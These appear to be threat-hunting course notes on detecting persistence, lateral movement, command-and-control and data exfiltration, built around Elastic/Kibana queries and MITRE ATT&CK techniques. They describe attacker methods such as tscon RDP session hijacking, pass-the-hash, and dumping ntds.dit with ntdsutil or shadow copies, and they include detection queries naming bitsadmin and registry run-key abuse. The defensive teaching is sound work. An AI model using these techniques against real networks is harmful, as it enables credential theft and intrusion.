The user Administrator on the host eng-wkstn-1 created the object HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\duck with the value of C:\duck.exe. Suspicion is raised any time an executable is located in the root of the C:\ directory.

﻿

Query
agent.type: winlogbeat AND event.module: sysmon AND ((event.code: 13 AND winlog.event_data.TargetObject: "*CurrentVersion\Run*") OR (event.code: 1 AND process.pe.original_file_name: reg.exe AND process.command_line: "*CurrentVersion\Run*"))
﻿

False Positives
﻿

The user eng_user01 created a run key for OneDrive and, at first glance, it may look suspicious because the OneDrive.exe file it is pointing to is located in C:\Users\eng_user01\AppData\Local\Microsoft\OneDrive\OneDrive.exe. Normally, legitimate programs are installed in the Program Files folders, but AppData is often used because it does not require administrator privileges to install programs there.

﻿

Scheduled Tasks
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 created a scheduled task to execute C:\Users\Administrator\AppData\Local\duck.exe on login. While programs are sometimes installed to AppData locations, they are in a parent folder for the specific program and not dropped in the root of the Local or Roaming folders.

﻿

Query
agent.type: winlogbeat AND event.dataset: process_creation AND event.module: sysmon AND event.code: 1 AND process.pe.original_file_name: schtasks.exe
﻿

False Positives
﻿

There was one event where the schtasks command was run with no flags.

﻿

BITS Jobs
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 used bitsadmin.exe to configure a BITSAdmin job that executed goose.exe that reaches out to the attacker’s machine in an attempt to open a backdoor. 

﻿

Query
agent.type: winlogbeat AND event.dataset: process_creation AND process.pe.original_file_name: "bitsadmin.exe" AND process.command_line: ("*Transfer*" OR "*Create*" OR "*AddFile*" OR "*SetNotifyCmdLine*" OR "*SetMinRetryDelay*" OR "*Resume*")
﻿

False Positives
﻿

No false positives appeared.

﻿

Services
﻿

Description
﻿

The user Administrator on the host eng-wkstn-1 attempted to start the suspicious service C:\Program Files\go.exe.

﻿

Query
﻿

The following query is used in Kibana's Lens application to take a quick glance at what services were created during the allotted hunt time range:

agent.type: winlogbeat AND event.dataset: system AND event.code: 7045
﻿

Enter the following queries into the Lens:

event.code.keyword
winlog.event_data.ImagePath
﻿

These reveal the suspicious service C:\Program Files\go.exe. Now that the name and path of the service are known, event.code 1 and 13 can be utilized to gather more information.

﻿

False Positives
﻿

No false positives appeared.

﻿

Cron Jobs
﻿

Description
﻿

Several cron jobs were created by the users JCTE and root on the host cups-server. These actions need further investigation by gaining direct access to the cups-server host or by using a tool like OSquery to query the cron jobs on the host. 

﻿

Query
agent.type: auditbeat AND event.module: auditd AND tags: cron AND event.action: ("renamed" OR "changed-file-ownership-of")
﻿

False Positives
﻿

No false positives appeared.

﻿

Account Creation
﻿

Description
﻿

A new user, larry, was created on the cups-server and was provided root privileges. This action requires validation to ensure it was approved activity. It can also be used as a jumping-off point for a deeper investigation to see if the user larry performed any suspicious activity after creation.

﻿

Query
agent.type: auditbeat AND event.module: system AND event.dataset: user AND event.action: user_added
﻿

False Positives
﻿

No false positives appeared.

﻿

UNIX Profile Configuration Modification
﻿

Description
﻿

The user root modified /etc/profile on the cups-server host. This action requires validation to ensure it was approved activity.

﻿

Query
agent.type: auditbeat AND event.dataset: file AND event.action: (updated OR attributes_modified) AND file.path: "/etc/profile"
﻿

False Positives
﻿

No false positives appeared.


########## M3 L4 ############
############# Recognizing Lateral Movement ############

Lateral Movement TTPs
There are many different techniques that can be used for lateral movement, which is why it is very hard to detect threats moving throughout the network. Lateral movement is often used to enter and control remote systems on a network. In order to achieve their primary objectives, adversaries often explore the network in order to find their target and gain access to it. This often involves pivoting through multiple systems or accounts.  

﻿

The following techniques are all from the MITRE ATT&CK framework. They are some of the most popular lateral movement techniques that adversaries are known to use.

﻿![image](https://github.com/user-attachments/assets/8253a7a8-2d84-4761-9eb4-384bf567d28b)

Exploitation of Remote Services (T1210)
Adversaries are known to exploit remote services to gain access to internal systems, once they are inside a network. Adversaries can exploit software vulnerabilities within a program or the OS to execute code. The goal is to enable access to a remote system.

  

Adversaries first need to determine if the remote system is vulnerable. This is done through discovery methods such as network service scanning to obtain a list of services running on the target to find one that may be vulnerable. This includes methods such as port scans and vulnerability scans. It typically uses tools that the adversary brings onto the system. Services that are commonly exploited are SMB, Remote Desktop Protocol (RDP), and applications that use internal networks such as MySQL (Structured Query Language).

﻿

Detecting software exploitation is difficult because some of the vulnerabilities may cause certain processes or applications to become unstable or crash. Look for abnormal behavior of processes such as suspicious files written to a disk or unusual network traffic. If application logs are accessible, this is a good place to look for evidence of lateral movement.

Remote Services (T1021)
Adversaries that have already compromised and acquired valid user accounts and logins use them to access services specifically designed for remote connections such as SSH, Virtual Network Computing (VNC), and WinRM. If an adversary is able to obtain a set of valid domain credentials for an environment, they can essentially log in to any machine in the environment using remote services such as RDP or SSH.

﻿

If an adversary wishes to exfiltrate data as part of the lateral movement, they can use SMB to remotely connect to a network share. Windows also has hidden network shares that are only accessible to administrators to allow for remote file copy and other administrative functions. Some examples of these network shares include C$, ADMIN$, and IPC$. Adversaries use this technique in conjunction with an administrator-level account to remote access a network over SMB and transfer files or run transferred binaries through remote execution.

﻿

Adversaries take advantage of remote systems using WinRM, which is a Windows service and protocol that allows a user to interact with a remote system. This service can be called with the winrm command using a program such as PowerShell. WinRM can be used to remotely interact with other systems on a network and move laterally throughout an environment. When using WinRM remotely through PowerShell, the child process wsmprovhost.exe is spawned, which indicates an adversary is using remote code execution to laterally move within a network.

﻿

Adversaries take advantage of Windows administration tools, like PSExec, that are used for remotely managing hosts. PSExec is a lightweight standalone utility that allows interactive access to the programs it runs remotely. If an adversary has already obtained compromised credentials and has access to an environment, it can use PSExec to execute commands on another host. PSExec activity involves remote service creation events, which generate Windows Event Identifiers (ID) 7045. When PSExec is used, it spawns a PSEXEVC service, which should also be monitored.

﻿

When discovering or hunting for remote services lateral movement, correlate the use of login activity with remote services executed. Monitor user accounts logged into systems that they normally do not access or accounts that do not normally use remote services. Look for Windows Event ID 4624 pertaining to new user login sessions and Event ID 4648 for an attempted login. In addition, Windows Event IDs 5140 and 5145 relate to opening network shares. Monitor remote login events and any users connected to administrative shares for suspicious activity. 

﻿

In addition, monitor network traffic such as Zeek connection logs and Sysmon Event ID 3 logs. For lateral movement techniques such as using WinRM, the service attempts to connect via port 5985 or 5986. Suspicious traffic often exploits ports such as port 22 for SSH or port 3389 for RDP.

Remote Service Session Hijacking (T1563)
Pre-existing sessions with remote services are often exploited to move laterally in an environment. Users log into a service designed to accept remote connections such as SSH or RDP and establish a session that allows them to maintain continuous access to the remote system. Adversaries take control of these sessions to further their attacks using remote systems. This differs from the Exploitation of Remote Services because adversaries are hijacking an existing session rather than creating a new one using valid accounts. 

﻿

Adversaries hijack a legitimate user's active SSH session by taking advantage of the trust relationships established with other systems via public key authentication. This happens when the SSH agent is compromised or access to the agent's socket is obtained.    

  

Adversaries also hijack legitimate remote desktop sessions to laterally move throughout a network. Typically, a user is notified when someone is trying to take over their RDP session. With System permissions, and using this path for the Terminal Services Console c:\windows\system32\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or alerting the user. 

﻿

Detecting lateral movement within remote session hijacking is difficult because often the sessions are legitimate. Adversaries do not start a new session like some of the other techniques; they take over an existing one. Often the activity that occurs after a remote login attempt indicates suspicious activity. Monitor for user accounts that are logged into systems not normally accessed or multiple systems that are accessed within a short period of time.

Taint Shared Content (T1080)
Threat actors deliver malicious payloads to remote systems by adding content to shared locations such as network drives or shared code repositories. This content can be corrupted by adversaries when they add malicious programs, scripts, or code to files that are otherwise normal. Once a user opens the file, the malicious content placed by an adversary is triggered, which can cause lateral movement within a network. 

    

For example, malicious code is embedded into a shared Excel spreadsheet. When the infected file is shared within an organization, each machine that opens it becomes infected. This allows adversaries to hunt on each machine for their target data or account to accomplish their desired goals. Both binary and non-binary formats ending with the file extensions .exe, .dll, .bat, and .vbs are targeted.

﻿

Shared content that is tainted is often very difficult to detect. Any processes that write or overwrite many files to a network share are suspicious. Monitor processes that are executed from removable media and for malicious file types that do not typically exist in a shared directory.

Use Alternate Authentication Material (T1550)
If an adversary is unable to acquire valid credentials, they may use alternate authentication methods such as password hashes, kerberos tickets, or application access tokens to move laterally within an environment. Authentication processes require valid usernames and one or more authentication factors such as a password or Personal Identification Number (PIN). These methods generate legitimate alternate authentication material. This material is cached, which allows the system to validate the identity has been successfully verified without asking the user to reenter the authentication factors. The alternate material is maintained by the system, either in the memory or on the disk. Adversaries steal this alternate material through credential access techniques in order to bypass access controls without valid credentials.  

﻿

When local commands are run that are meant to be executed on a remote system, like scheduling remote tasks, the local system passes its token to the remote system. If the currently active user has administrative credentials, they can execute the commands remotely.

﻿

Adversaries also use the Pass-the-Hash (PtH) attacks to steal password hashes in order to move laterally. PtH is a method of authenticating as a user without having access to the user's cleartext password. When performing this technique, valid password hashes are captured using various credential access techniques. Captured hashes are used to authenticate as that user. This allows adversaries to move laterally through an environment. 

﻿

Detecting this lateral movement technique includes monitoring Windows Event IDs 4768 and 4769, which are generated when a user requests a new Ticket-Granting Ticket (TGT) or service ticket. All login and credential use events should also be audited and reviewed. Unusual remote logins, along with other suspicious activity, indicate something malicious is happening. New Technology Local Area Network (LAN) Manager (NTLM) Logon Type 3 authentications that are not associated with a domain logon are also suspicious.

Lateral Movement Tools
Adversaries often use tools that are integrated into the OS to move laterally through the network and deliver malicious payloads.  

PsExec: PsExec is a utility that is part of the Sysinternals suite. It is a command-line administration tool that administrators can use to remotely execute processes and manage systems. 
SCP (Secure Copy): The Unix-like Command-Line Interface (CLI) is used to transfer files between systems. This can be used to move malicious files across the network.
Remote Session Tools (SSH, WinRM, SMB, RDP, WMI): The remote session protocols for Unix-like and Windows OSs. Threat actors may attempt to hijack a session or use compromised valid credentials in order to use these tools to move laterally across the network.
Task Scheduler: A Windows tool used to achieve persistence and continuously execute malicious payloads.
cron: A Linux tool, similar to Task Scheduler, that allows administrators to automate scheduled tasks at a set time. Used to achieve persistence and deliver malicious payloads.

########## M3 L5 ############
############# Recognizing C2 and Exfiltration ############


Command and Control Overview
What is Command and Control?
﻿

Each outbound beacon is an opportunity for defenders to detect malicious actors. These beacons provide the C2 protocol for the attackers. This means every exploit payload has some form of C2. The ubiquitous nature of C2 techniques means that being able to detect C2 behavior is critical to reduce the time an aggressor is able to maintain access within a network. This section details common C2 TTPs and defense evasion tactics.

﻿

Getting Around Firewalls
﻿

Many movies featuring hackers present network infiltration as the inevitable output of a few hours of rapid keyboard typing. However, the biggest idea these movies get wrong about cyber is firewalls. Threat actors are unlikely to gain direct access to a machine through the internet if a network firewall is blocking inbound traffic to the target workstation. However, there are other ways threat actors gain access to these machines that allow them to freely move around networks with firewalls.

﻿

Although a properly-configured network firewall blocks inbound traffic to host machines, these firewalls rarely block outgoing traffic to the internet. An organization may employ a network policy that only allows the web ports (80 and 443) outbound, but this does not stop hackers from being able to successfully control a system on the other side. This is possible with beaconing malware, which is a malicious agent on the victim's system that connects outbound to the attacker to provide command and control.

﻿

C2 TTPs
﻿

Attackers have to get over obstacles to successfully exploit systems. Table 3.5-1, below, presents the C2 TTPs that are common for attackers to use because they overcome the defenses that are commonly in place.

﻿
![image](https://github.com/user-attachments/assets/df6f2ec1-46f5-4d25-9d29-9e8a120024a1)

﻿

Table 3.5-1﻿

﻿

Application Layer Protocols (T1071)
﻿

The most common way malware communicates out of a network is through application layer protocols. In this technique, the attacker sets up a seemingly normal web server or File Transfer Protocol (FTP) server, then uses that network connection to control the endpoint. This activity is tricky to view on the network because it naturally blends in with legitimate application traffic.

﻿

Communication Through Removable Media (T1092)
﻿

Communicating through removable media allows attackers to transfer commands to hosts on networks without internet access. In 2008, the malware known as Agent.BTZ was used in a massive cyberattack against the United States (US) military. Agent.BTZ was able to gain access to both classified and unclassified networks. This malware was able to execute using the file autorun.inf, a technique that MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) describes in T1091. Removable media was being swapped back and forth between networks with and without internet access, so the attackers were able to perform C2 and data exfiltration actions.

﻿

Web Service (T1102)
﻿

An attacker may implement a C2 protocol using popular web services to communicate with malware. If an attacker is using a shopping website, for example, the malware simply needs to connect to a predefined product on that site and just read the comments. The attacker can then add in a seemingly benign comment such as, "This broke after 1 use, very bad, do not recommend." This comment signals the malware to behave in a certain way (T1102.003). Some malware may also make comments back on the same page as part of a bidirectional communication tactic (T1102.002).

﻿

A real-world example of this technique was discovered in 2017 with malware that is suspected to be Russian state-sponsored. The malware searches for specific commands in the comments on Britney Spears' Instagram page. The algorithm in the malware decodes the comments into C2 server domains. A regular expression matches certain letters in the comments and those letters become a shortened Uniform Resource Locator (URL) link that resolves to the actual C2 server.

﻿

Detecting this technique at the network layer is difficult because it requires more contextual information, such as the normal working hours for employees. A sudden increase in traffic to one Instagram profile should register as odd to defenders analyzing the network layer. At the host layer, detection options include viewing web requests from unknown binaries.

﻿

Traffic Signaling (T1205)
﻿

Systems connected directly to the internet are scanned often. The traffic signaling TTP works by delivering encoded commands as logs that seemingly come from random internet traffic. Port knocking (T1205.001) is a great example of this. As an example, the "magic" command may be two consecutive failed attempts on three predefined ports. The logs in this example would present data as follows:

Connection refused port 90 March 11 2022 12:25:14 PM

Connection refused port 90 March 11 2022 12:25:15 PM

Connection refused port 70 March 11 2022 12:25:16 PM

Connection refused port 70 March 11 2022 12:25:17 PM

Connection refused port 60 March 11 2022 12:25:18 PM

Connection refused port 60 March 11 2022 12:25:19 PM

﻿

This signals the malware to perform a predefined action. The actions may be creating a connection back to the system performing the knocking, opening up a port to connect inbound, or even deleting everything on the system.

﻿

C2 Defense Evasion Tactics
﻿

The ways around defensive signatures are numerous and limited only by the attacker's imagination. However, once defenders understand the C2 protocol, they can block it. Blocking may require expensive technology, but it is always possible. Part of understanding C2 protocols is recognizing that all of these evasion techniques have the goal of hiding suspicious traffic. Popular ways for attackers to evade defensive measures include Encryption (T1573) and Dynamic Resolution (T1568).

﻿

Encryption (T1573)
﻿

Encryption was created to improve security. This may seem ironic, considering that it can also be used to provide safe, secure communications for nefarious activities. Any off-the-shelf encryption algorithms provide what most hackers need. These algorithms can be either symmetric or asymmetric. Symmetric encryption is fast and secure, but does not help much with preventing unauthorized access. Asymmetric encryption allows software to be deployed without someone removing the key and issuing their own commands. The more unusual the communication protocol, the more obvious the encryption traffic is going to be. 

﻿

Secure software typically starts with asymmetric encryption, then passes keys to continue the conversation with symmetric encryption algorithms because symmetric encryption is considerably faster to compute. While it is possible for hackers to do everything with asymmetric keys, it is considered bizarre because of the extreme amounts of computational power required for asymmetric encryption. 

﻿

Dynamic Resolution (T1568)
﻿

Domain Name Systems (DNS) play an invisible role in all network communications. DNS is the source of several C2 defense evasion tactics including DNS Calculation (T1568.003), Fast Flux DNS (T1568.001), and Domain Generated Algorithms (DGA T1568.002).

﻿

DNS Calculation (T1568.003)﻿

﻿

When a computer sends a DNS request, it is asking for the Internet Protocol (IP) address associated with a domain, normally to connect to that IP address. With the DNS calculation tactic, the malware decodes a different IP address and potentially ports from the original address returned from the DNS query. This allows attackers to throw off a defender who may be looking for traffic to the IP provided by the DNS resolution. The specifics are limited only by the creativity of the malware author. The attacker may have the malware flip the IP address such that 1.2.3.4 becomes 4.3.2.1. Another possibility is pulling out a port from an IP address, such as changing 4.3.2.180 to 4.3.2.1:80.

﻿

Fast Flux DNS (T1568.001)﻿

﻿

DNS is not a 1:1 relationship. Multiple domains can resolve to the same IP address and multiple IP addresses can resolve to the same domain. In the case of a fast flux network, the attackers change the IP addresses associated with a single domain very rapidly. This makes it difficult to block an IP address since the registrations have an average life span of 5 mins.

﻿

Domain Generation Algorithms (DGA) (T1568.002)﻿

﻿

DGA makes it difficult to block a domain. If a piece of malware has a single domain hard-coded in the binary, then researchers can find that domain and proactively block it. DGAs work like two-factor security tokens that are constantly generating a 6-digit number based on a seed value. The malware tries to reach out to a randomly-generated domain name on a predefined time interval. When the attacker wants to communicate with the malware, the attacker just needs to register one of the millions of domains the malware tries to use. Since these algorithms are not truly random, the attacker knows the exact time or domain the malware will attempt to connect. Defensive tools that block domains typically do not accept DGAs as input. Blocking the DNS request is prohibitively difficult since DNS servers do not have unlimited resources.

﻿------------------------------------------------------------------------------------------------------------

C2 Logs and Data Sources
Network-based logging provides the primary log and data sources for detecting C2 and data exfiltration. However, host analysts can gather relevant information from these sources, as well.

﻿

Gathering Network-Based Logs from the Host
﻿

Using the host to gather network logs is not ideal, but there are situations where this is the only option. The reason the network-based logs are a better choice is because the logging is centralized and difficult to tamper with. 

﻿

To use the host, defenders can configure Sysmon to provide network log data. The Sysmon Events noted below, with their respective Identifiers (ID), provide important details that are available at the host level. This information is not provided at the network level.

Sysmon ID 3: Network Connections: Provides information with name resolution of the IP address.

Sysmon ID 22: DNS Query: Displays processes that make the query.

A more detailed list of events emerges when this information is logged and correlated with other event logs. Sysmon ID 1 displays process creation along with the hash of the file. Sysmon ID 7 displays when an image is loaded into memory and provides information on whether the binary is digitally signed. A Security Information and Event Management (SIEM) tool alerts on subtle combinations of events, which defenders can use to create powerful signatures. 

﻿

Detecting C2
﻿

This section covers various ways to detect C2 at the host and network layers. There are many ways to detect C2 activity due to its varied nature. Several successful strategies include checking for a specific tactic by analyzing specific logs, checking for anonymous behavior in general, and looking for contextual inconsistencies. 

﻿

Hypothetical Signature to Detect DNS Calculation (T1568.003)
﻿

One way to detect C2 is to check for a specific tactic by analyzing specific logs. Below is a list of expected behavior for this tactic and their related data sources:

Process loads that is not digitally signed

Sysmon Event ID 7: Image Loaded

Request for a domain

Sysmon Event ID 22: DNSEvent

Process connects to an IP address

Sysmon Event ID 3: Network Connection

Windows Event ID 5156: The Windows Filtering Platform has permitted a connection

The content from these logs needs to be put in context for this signature to work. The process name from the ID 7 log would be seen in the ID 22 and ID 3 logs. Then, the alert would fire when the IP that was resolved in ID 22 did not match ID 3 within a certain time frame.

﻿

Detecting Frequency-Based Network Connections
﻿

C2 protocols used by malware are going to vary significantly. As defenders find new ways of detecting these C2 channels, the attackers will find new ways to hide them. One constant, however, goes back to the original problem that beaconing malware is trying to solve. That is, getting past a firewall that does not allow inbound connections. 

﻿

Attackers cannot freely communicate with a system on the other side of a firewall that is blocking inbound connections. Instead, that system has to go outbound to the attacker. That means there is this delicate balance between the attacker being able to communicate with the malware and how noisy the malware is going to be on the network when reaching back out. A higher frequency of outbound connections shortens the maximum time an attacker has to wait. Conversely, if the time between beacons is too long, it becomes difficult for the attacker to gain access when required. 

﻿

Figure 3.5-1, below, illustrates how the number of beacons an attacker employs in a day affects attacker convenience and stealth. More beacons rapidly increase attacker convenience up to a certain point, before convenience only increases incrementally. This greater convenience comes at the cost of an exponential decrease in stealth.

﻿
![image](https://github.com/user-attachments/assets/986c0720-d371-4189-a595-e9407cc6cae6)

﻿

Figure 3.5-1﻿

﻿

The most obvious beaconing malware has a static amount of time between beacons. The beacons are the same. A beacon, in this sense, is any of the previously mentioned C2 TTPs. Malware can be more tricky. The outbound connections for malware can be spaced out and more sporadic. Malware may even rotate through domains with a DGA. 

﻿

Beacons are also short messages that do not have much data. These messages only check for commands to execute. If there is a command to execute, then more data is transmitted, but not necessarily to the same system. For example, an infected system asks the C2 server for a command, but the C2 server replies with a command to upload a file to a secondary system.

﻿

Beacons Need Context
﻿

In the early 2010s, the Air Force saw a surge in alerts describing a known beacon for malware. For a moment, it looked like hundreds of computers were compromised. What actually happened was malicious actors had broken into a legitimate website and added a Hypertext Markup Language (HTML) comment on the front page of a small town's local news site. 

﻿

This malware worked by loading the news site, just like a normal user, then cutting out that special comment as a means of C2. None of the systems in the Air Force network were infected. The normal user activity appeared identical to malicious activity at the network layer.

﻿

One major benefit of host-based logging for these types of signatures is that the log contains more information than what is logged at the network level. Sysmon allows logging of the exact process that is making a web request. This helps determine if a known good process was making that web request or if it was a binary that was recently added to the machine. There are ways around this as an attacker. If the attacker had done process injection into a web browser, then all the attackers requested would be coming out of that "known good" process. 

﻿

Detecting Anomalous Artifacts within Web Request Artifacts
﻿

All web requests have a metadata section called "headers." This is where clients advertise their compatible browser versions and attach any cookies. The server also has details in these headers to help facilitate communication. Complicated software, such as a web browser, has a lot of "edge cases" or rare situations to account for. Malware clients and servers are dramatically simpler and do not have these requirements. In an effort to blend in with legitimate traffic, malware pre-populates these fields with data that can be convincing, but does not perfectly match the chaos of actual web traffic. 

﻿

User-Agent Strings (Request Header)﻿

﻿

Network clients announce their compatibility with certain software versions to servers. This is done over the web with a user-agent string. The default user agent string for a system running Chrome 70.0.3538.77 is as follows:

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36.
﻿

This string starts with "Mozilla/5.0" even though this is Chrome. Mozilla is a non-profit that makes Firefox. The reason it is in all of these user-agent strings is because the string is showing what this client is compatible with so the server has a better chance of understanding how to present the webpage. 

﻿

User-agent strings are one of those small details that are hard to keep up-to-date. Even if the installed malware hard-codes the exact user agent string used by the system's browser, it only takes one update to make it stand out again. 

﻿

Server Value (Response Header)﻿

﻿

When a web client asks for data from a server, the response has headers populated by the server. One of these fields is just called "server" and has the name and version of the web server. A bad malware author may not adjust this detail and the malware server may be easy to identify.

﻿

Encryption﻿

﻿

In an ironic twist, encryption is used by malicious actors to make computer systems more insecure. With a Hypertext Transfer Protocol Secure (HTTPS) connection, the malicious traffic becomes significantly more difficult to analyze because the entire connection, including headers, is unreadable.

﻿

Systems do exist to enable defenders to see within encrypted traffic and are available to large organizations with deep pockets. The way these work is also ironic because they use a common attacker technique called Person-In-The-Middle (PITM). With this setup, all hosts within a network make secure, encrypted communications to a web proxy. Then, that web proxy makes a secure, encrypted connection to the website. Within that machine, the network traffic is unencrypted and can be logged and manipulated by network defense technologies. 

﻿

These systems are expensive because they need to have specialized hardware to support fast encryption processing.

----------------------------------------------------------------------------

-Recognizing Data Exfiltration TTPs
Exfiltration Behaviors on the Network
﻿

Data exfiltration is simply unauthorized data being removed from a network. It occurs when attackers have successfully exploited a target network and are attempting to pilfer the contents.

﻿

Figure 3.5-6, below, summarizes exfiltration TTPs documented by the MITRE ATT&CK framework. In this illustration, arrows moving away from the file indicate exfiltration tactics that cause the data to be removed from the system. Arrows pointing towards the file indicate exfiltration tactics that aid in defense evasion. Defense evasion tactics are mix-and-match and are able to be used in conjunction with other tactics.


﻿![image](https://github.com/user-attachments/assets/1208679f-fcdf-4c3b-945e-8179657e9045)


﻿

Figure 3.5-6﻿

﻿

The most common exfiltration techniques are just over the existing C2 channel using HTTPS. HTTPS blends in with normal web traffic and most organizations do not have the hardware to tear apart the encryption.

﻿

Exfiltration Behaviors on the Host
﻿

Exfiltration is relatively straightforward, however, there are a few things that attackers may stumble upon. These behaviors are present in the logs and in actionable hunt hypotheses.

﻿

Dynamically Changing File
﻿

Imagine an attacker wants to download a large file that gets updated on a regular basis. These files may include anything from databases to large PowerPoint files filled with images. One way to deal with this is to stage the file in a secondary location. Moving a copy of a file is much easier because the data can be broken up into smaller chunks and exfiltrated low and slow. Without the intermediary file, the file segments produce a corrupted file.

﻿

Hunting for staged exfiltrated files is a good starting point for networks that are assumed to have had a large amount of data exfiltrated. This is especially true if the logs for these networks also do not show any significant traffic spikes. 

﻿

Common places for data to be staged include the user's or operating system's temp directory. These files also tend to be compressed. The MITRE ATT&CK framework has an extensive list of threat actors and their favorite places to stage files. 

﻿

Possible staged file attributes include the following:

Large file size

Located in a temp folder

Compression

Incorrect file extension (such as a zip file that is labeled as .log)

Read/Write access is inconsistent with other temp files in that folder (For example, if the folder is for Google Chrome, but Chrome is not the program accessing the files)

Operating System Does Not Allow Access to the File
﻿

In a Windows computer system when a program needs to access a file the program asks the operating system for a "file handle." A handle is a temporary reference number the program gives back to the operating system when it wants to read or write from that resource. In Linux, this is called a "file descriptor." Forensically knowing what files a program is manipulating provides insight into the function of that program.

﻿

The file handle or file descriptor is a way for the operating system to ensure that only one program is able to manipulate a file at a time. If a program is actively reading or writing to a file, then other programs will not be able to get access to that data. This is referred to as a file being "locked open."

﻿

Antivirus software uses the file handle step to scan files for viruses and similar threats when a user tries to open the file. This saves the antivirus software from having to constantly recheck every file on a system every time a new malware signature is added. While unlikely, it is possible for an attacker to generate logs by trying to open a non-malicious file and inadvertently triggering the antivirus program to create an alert.

﻿

Attackers have developed several different methods for getting data from a file that is locked, including the following:

Raw file system access

Vssadmin

Diskshadow

NTDSUtil

﻿

Raw File System Access﻿

﻿

The operating system is interacting with the underlying file system when it reads and writes data to the file on the hard disk. It is possible for a program to bypass the operating system and directly access the volume (T1006). Since PowerShell has the same capabilities as a compiled program, there exists a PowerShell script that can directly access files on the disk named "NinjaCopy." This technique bypasses an antivirus that is watching for programs to access a file as well as any administrative controls on the file defined in the operating system. 

﻿

MITRE ATT&CK links these attack techniques to threat actors. This technique has not been seen used by any particular threat actor, however, this technique is also extremely difficult to detect and mitigate. Currently, the only known detection method is installing Sysmon and monitoring for Event ID 9: Raw disk access. Enabling that logging increases system load.

﻿

The good news is that this requires admin access, anyway, so the bypassing of administrative controls is not as bad as it sounds. There are also a limited number of systems that benefit from this logging, namely just the domain controller.

﻿

Vssadmin﻿

﻿

VSSADMIN is a built-in Windows command that is used to manipulate volume shadow copies. A volume shadow copy is a Microsoft technology that can create backup copies of files or volumes even when they are in use.

﻿

A hacker leverages this technology by making a volume shadow copy of the drive with the locked files, copying over the locked files, and then deleting the volume shadow copy.

﻿

Diskshadow﻿

﻿

Diskshadow is a built-in Windows command that replaces vssadmin for modern operating systems. Diskshadow is for Windows 8+ era operating systems, however vssadmin also works. 

﻿

﻿

NTDSUtil﻿

﻿

The "crown jewel" of files that exists within a network lies on the domain controller. It is the file ntds.dit. This file is the database that stores active directory data, which includes usernames and passwords for every user. It is locked because the domain controller is always actively using it.

﻿

Ntdsutil is a Windows built-in command that is used to perform database maintenance functions for active directory domains. The function that attackers use is its ability to create a full dump of the ntds.dit database to disk. The dumped data is then exfiltrated.

﻿
----------------------------------------------------------------------

Data Exfiltration Data Sources
Exfiltration Log Sources
﻿

At the most basic level, exfiltration is moving data out of the network. Network traffic-based logs are the most useful sources for identifying exfiltration. However, there are also several other sources on the host that help with this identification.

﻿

Network Layer Detection
﻿

Bytes sent and received and the number of connections in a given time are useful metrics to capture and analyze. At the network layer, these data sources are found on the respective network devices responsible for providing those services. DNS logging is best provided at the lowest level, nearest the host. Network connection logs are important to collect at the service, instead of just at the boundary firewall. This is because the service provides additional context where the boundary device, such as a firewall, only provides metadata on the connection.

﻿

Producer-Consumer Ratio (PCR)
﻿

The PCR is a simple ratio of upload versus download, as demonstrated in Figure 3.5-7, below. While PCR does not directly correlate with malicious activity, it is an additional indicator for defenders to consider. Coupled with other indicators, PCR provides additional insight into the traffic.

﻿

This illustration below shows how PCR is calculated. A session that is biased towards downloading data has a negative value, with -1 indicating 100% download. A session that is biased towards uploading has a positive value, with 1 indicating 100% upload. Over large datasets, certain protocols converge to various values. For example, web browsing is typically around -0.5 while activity such as sending an email is normally around 0.4. Protocols such as Network Time Protocol (NTP) and Address Resolution Protocol (ARP) tend to send and receive equal amounts of traffic. They are considered "balanced" in terms of the PCR. 

﻿
![image](https://github.com/user-attachments/assets/c3fa757e-433c-44b8-947c-c3d13427a17d)

﻿

Figure 3.5-7﻿

﻿

Host Layer Detection
﻿

It is harder to hide malware in host-based logs due to the additional context. At the network layer, a web request only contains the source and destination along with the message. At the host layer more context is available. Not only is the exact binary known at the host level, but that binary's digital signature status is also apparent. 

﻿

Detecting Staging
﻿

Data staging has a few attributes that produce forensic evidence on the host. If the attacker uses built-in Windows commands to make a copy of a dynamic or locked file, then the creation of those processes can be captured by a properly configured Sysmon deployment. These processes include NTDSUtil, Diskshadow, and VSSAdmin. The process creation generates a Sysmon Event ID 1: Process Creation, Sysmon Event ID 7: Image loaded, and a Windows Event ID 4688. 

﻿

If the attacker is using a tool such as Ninja-Copy to do raw file system access (T1006), the corresponding Sysmon event for this particular technique is Event ID 9: RawAccessRead.

﻿

Regardless of how the attacker makes a copy of the file, the staged file generates a Sysmon Event ID 11: FileCreate and a Windows Event ID 4663. 

﻿

Detecting Anomalous Network Connections 
﻿

Host-based network traffic logging is covered by Windows Event ID 5156 and Sysmon Event ID 3. Both of these events provide the name of the executable using the network, as well as the metadata on the network connection (source, destination IP, and port). Coupled with Sysmon Event ID 7, the defender is armed with the hash and knowledge of whether or not the binary is digitally-signed and trusted by the host.

﻿

One way for the attacker to bypass this type of logging is to inject the malicious payload into a process that normally conducts network traffic. For example, the attacker may have a binary that exfiltrates data out of the network that spoofs a Firefox user-agent string. In this case, injecting that library into a running Firefox browser makes discovery of the exfiltration difficult, even for a host-based analyst. 

﻿

While an injected payload makes data exfiltration harder to discover in the logs, it just means that the defender needs to detect process injection. Detecting process injection is outside the scope of this lesson, however, this is another technique that Sysmon detects, with the proper configuration. Further reading on process injection is available at the MITRE ATT&CK website. Currently, eleven different techniques are documented by MITRE.

﻿
------------------------------------------------------------------------

Elastic Scripting Primer
The previous section of this lesson provided the logic behind calculating the PCR. The following workflow provides a script to detect PCR in web traffic. This section provides a brief refresher and explanation of the scripting concepts used in the upcoming workflow.

﻿

Below, Figure 3.5-8 describes the steps in the Elastic script scripted_metric. The major stumbling block is that Elastic runs the scripts in parallel to speeding up searches. This means that the script does not provide all the search items at a single time. Instead, the search is broken apart into “shards.” Elastic executes each shard independently before bringing them back together into a single final output.

﻿

The four sections of the scripted_metric include init_script, map_script, combine_script, and reduce_script. Only the first section, init_script, is optional. The rest of the sections are required. The sequence for these sections is as follows:

﻿

init_script: Defines variables to use between the map_script and combine_script steps.

A query filters all items into shards for the rest of the script. This step defines the state variables for each shard. 

map_script: Maps the given Elastic documents into the variables defined in the init_script step. 

The values within the searched documents are in scope at this step and can be accessed in the code. This step stores data, but does not return anything.

combine_script: Returns data. 
